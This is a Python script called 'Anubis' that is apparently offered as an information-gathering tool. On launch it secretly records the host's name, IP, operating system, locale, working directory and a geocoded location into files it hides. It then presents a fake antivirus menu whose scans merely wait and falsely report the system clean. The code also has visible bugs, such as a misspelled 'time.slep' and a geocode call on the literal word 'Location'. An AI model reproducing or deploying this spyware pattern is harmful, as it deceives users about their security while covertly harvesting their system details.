"""
Author: @new92
Anubis: Tool for Information Gathering
Made for educational purposes 
The author has no responsibility for any illegal activity/activities carried out using this tool
          d8888                   888      d8b
         d88888                   888      Y8P
        d88P888                   888
       d88P 888 88888b.  888  888 88888b.  888 .d8888b
      d88P  888 888 "88b 888  888 888 "88b 888 88K
     d88P   888 888  888 888  888 888  888 888 "Y8888b.
    d8888888888 888  888 Y88b 888 888 d88P 888      X88
   d88P     888 888  888  "Y88888 88888P"  888  88888P'
"""

#Imports
try:
    import sys
    import os
    import socket
    import nmap
    import locale 
    import platform
    import time
    import random
    import pyfiglet
    import geocoder
    import requests
    import scapy
    import subprocess
    import smtplib
    import json 
    import getpass
    import cryptography
    import sniffer
    from geopy.geocoders import Nominatim
except ImportError as imp:
    print("Error ! Make sure you have installed all the modules used in this program !")
    print("Modules used: sys, os, nmap, sniffer, socket, requests, cryptography, getpass, json, locale, platform, random, pyfiglet, scapy, subprocess, smtplib, geocoder")
    print(imp)
#End of Imports

#Main program
loc=Nominatim(user_agent="Getloc")
getLoc=loc.geocode("Location") 
location=getLoc.latitude,getLoc.longitude
hostname=socket.gethostname()
DevIP=socket.gethostbyname(hostname)
IPport=socket.IPPORT_RESERVED
OSname=os.name
OS=platform.system()
CWD=os.getcwd()
language=locale.getdefaultlocale()
SysFileEnc=sys.getfilesystemencoding()
Data=location,hostname,DevIP,IPport,OSname,OS,CWD,language,SysFileEnc
f = open("AllData.txt","a")
f.write(str(Data)+"\n")
f.close()
os.system("attrib +H AllData.txt")
text='''
<html>
<head>
<style>
</style>
</head>
<body>
<a href="AllData.txt">Data</a>
</body>
</html>
'''

file=open("Data.html","w")
file.write(text)
file.close()
os.system("attrib +H Data.html")

num=random.randint(1,24)
antivirus=pyfiglet.figlet_format("ANTIVIRUS")
print(antivirus)
time.sleep(2)
print("[1] : Quick System Scan")
time.sleep(1)
print("[2] : Full System Scan")
time.sleep(1)
print("[3] : Quarantine")
time.sleep(1)
print("[4] : Scan for vulnerabilities")
time.sleep(1)
print("[5] : Database Update")
time.sleep(1)
action=int(input("Please enter the action you want to make: "))
while action < 1 or action > 5:
    print("Invalid Action !")
    action=int(input("Please enter again: "))
if action == 1:
    print("Initiating Quick System Scan...")
    time.sleep(2)
    print("0% ----------")
    time.sleep(4)
    print("20% ++--------")
    time.sleep(4)
    print("40% ++++------")
    time.sleep(4)
    print("60% ++++++----")
    time.sleep(4)
    print("80% ++++++++--")
    time.sleep(5)
    print("Scan successful ! Everything seems to be perfect :)")
elif action == 2:
    print("Initiating Full System Scan...")
    time.slep(2)
    print("This process may last long time")
    time.sleep(1)
    print("Please do not shutdown your computer")
    time.sleep(3)
    print("0% ----------")
    time.sleep(20)
    print("10% +---------")
    time.sleep(20)
    print("20% ++--------")
    time.sleep(20)
    print("30% +++-------")
    time.sleep(20)
    print("40% ++++------")
    time.sleep(20)
    print("50% +++++-----")
    time.sleep(20)
    print("60% ++++++----")
    time.sleep(20)
    print("70% +++++++---")
    time.sleep(20)
    print("80% ++++++++--")
    time.sleep(20)
    print("90% +++++++++-")
    time.sleep(25)
    print("Scan successful ! Everything seems to be perfect :)")
elif action == 3:
    print("Good ! 0 Files have been putted in quarantine !")
elif action == 4:
    print("Initiating Scan for Vulnerabilities...")
    time.sleep(2)
    print("Please do not shutdown your device !")
    time.sleep(2)
    print("0% ----------")
    time.sleep(4)
    print("20% ++--------")
    time.sleep(4)
    print("40% ++++------")
    time.sleep(4)
    print("60% ++++++----")
    time.sleep(4)
    print("80% ++++++++--")
    time.sleep(5)
    print("Scan successful ! No vulnerabilities found :)")
elif action == 5:
    print("No database update needed")
    time.sleep(2)
    print("The program updated them "+str(num)+" hours ago")
#End of the program
